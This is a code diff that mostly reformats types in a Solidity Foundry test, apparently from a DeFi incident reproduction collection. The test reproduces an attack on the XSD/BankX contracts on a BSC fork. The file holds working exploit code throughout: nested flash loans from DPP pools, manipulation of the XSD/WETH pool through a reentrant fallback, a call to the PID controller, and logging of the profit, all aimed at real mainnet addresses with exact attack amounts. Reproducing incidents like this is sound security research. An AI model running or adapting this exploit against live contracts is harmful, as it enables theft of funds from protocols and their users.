@@ -20,23 +20,23 @@ import "./interface.sol";
 // invoke function burnpoolXSD() after executing TransferHelper.safeTransferETH();
 
 interface IXSD is IERC20 {
-    function burnpoolXSD(uint _xsdamount) external;
+    function burnpoolXSD(uint256 _xsdamount) external;
 }
 
 interface IXSDRouter {
-    function swapXSDForETH(uint amountOut, uint amountInMax) external;
-     function swapETHForBankX(uint amountOut) external payable;
+    function swapXSDForETH(uint256 amountOut, uint256 amountInMax) external;
+    function swapETHForBankX(uint256 amountOut) external payable;
 }
 
 interface IXSDWETHpool {
     function PERMIT_TYPEHASH() external pure returns (bytes32);
-    function nonces(address owner) external view returns (uint);
+    function nonces(address owner) external view returns (uint256);
     function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
-    function price0CumulativeLast() external view returns (uint);
-    function price1CumulativeLast() external view returns (uint);
-    function kLast() external view returns (uint);
-    function collatDollarBalance() external returns (uint);
-    function swap(uint amount0Out, uint amount1Out, address to) external;
+    function price0CumulativeLast() external view returns (uint256);
+    function price1CumulativeLast() external view returns (uint256);
+    function kLast() external view returns (uint256);
+    function collatDollarBalance() external returns (uint256);
+    function swap(uint256 amount0Out, uint256 amount1Out, address to) external;
     function skim(address to) external;
     function sync() external;
 }
@@ -46,14 +46,8 @@ interface IPIDController {
 }
 
 interface IDPPAdvanced {
-    function flashLoan(
-        uint256 baseAmount,
-        uint256 quoteAmount,
-        address assetTo,
-        bytes calldata data
-    ) external;
+    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
 }
-
 
 contract ContractTest is Test {
     IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
@@ -64,14 +58,14 @@ contract ContractTest is Test {
     IXSDWETHpool XSDWETHpool = IXSDWETHpool(0xbfBcB8BDE20cc6886877DD551b337833F3e0d96d);
     IPIDController PIDController = IPIDController(0x82a6405B9C38Eb1d012c7B06642dcb3D7792981B);
 
-    uint baseAmount = 3_000_000_000_000_000_000_000;
-    uint moreAmount = 1_000_000_000_000_000_000_000;
-    uint attackAmount = 3_800_000_000_000_000_000_000;
-    uint swapAmount = 263_932_735_529_288_914_857_295;
-    uint exploitAmount = 56_964_339_410_199_718_035;
+    uint256 baseAmount = 3_000_000_000_000_000_000_000;
+    uint256 moreAmount = 1_000_000_000_000_000_000_000;
+    uint256 attackAmount = 3_800_000_000_000_000_000_000;
+    uint256 swapAmount = 263_932_735_529_288_914_857_295;
+    uint256 exploitAmount = 56_964_339_410_199_718_035;
 
     function setUp() public {
-        vm.createSelectFork("bsc", 32086901 - 1);
+        vm.createSelectFork("bsc", 32_086_901 - 1);
         vm.label(address(WBNB), "WBNB");
         vm.label(address(DPPOracle), "DPPOracle");
         vm.label(address(DPPAdvance), "DPPAdvance");
@@ -83,23 +77,23 @@ contract ContractTest is Test {
         approveAll();
     }
 
-    function testExploit() external{
-        uint startBNB = WBNB.balanceOf(address(this));
+    function testExploit() external {
+        uint256 startBNB = WBNB.balanceOf(address(this));
         console.log("Before Start: %d BNB", startBNB);
 
         DPPOracle.flashLoan(baseAmount, 0, address(this), abi.encode(baseAmount));
 
-        uint intRes =  WBNB.balanceOf(address(this))/1 ether;
-        uint decRes =  WBNB.balanceOf(address(this)) - intRes * 1e18;
+        uint256 intRes = WBNB.balanceOf(address(this)) / 1 ether;
+        uint256 decRes = WBNB.balanceOf(address(this)) - intRes * 1e18;
         console.log("Attack Exploit: %s.%s BNB", intRes, decRes);
     }
 
-    function DPPFlashLoanCall(address sender, uint amount, uint quoteAmount, bytes calldata data) external {
+    function DPPFlashLoanCall(address sender, uint256 amount, uint256 quoteAmount, bytes calldata data) external {
         if (abi.decode(data, (uint256)) == baseAmount) {
             DPPAdvance.flashLoan(moreAmount, 0, address(this), abi.encode(moreAmount));
             WBNB.transfer(address(DPPOracle), baseAmount);
-        }else{
-            uint amountOut  = 9_840_000_000_000_000_000;
+        } else {
+            uint256 amountOut = 9_840_000_000_000_000_000;
             Router.swapXSDForETH(amountOut, XSD.balanceOf(address(this)));
             XSD.transfer(address(XSDWETHpool), swapAmount);
             XSDWETHpool.swap(0, attackAmount + exploitAmount, address(this));
@@ -107,11 +101,11 @@ contract ContractTest is Test {
         }
     }
 
-    fallback() payable external {
+    fallback() external payable {
         WBNB.transfer(address(XSDWETHpool), attackAmount);
         XSDWETHpool.swap(swapAmount, 0, address(this));
         PIDController.systemCalculations();
-        Router.swapETHForBankX{value:1_000_000_000_000}(100);
+        Router.swapETHForBankX{value: 1_000_000_000_000}(100);
     }
 
     function approveAll() internal {
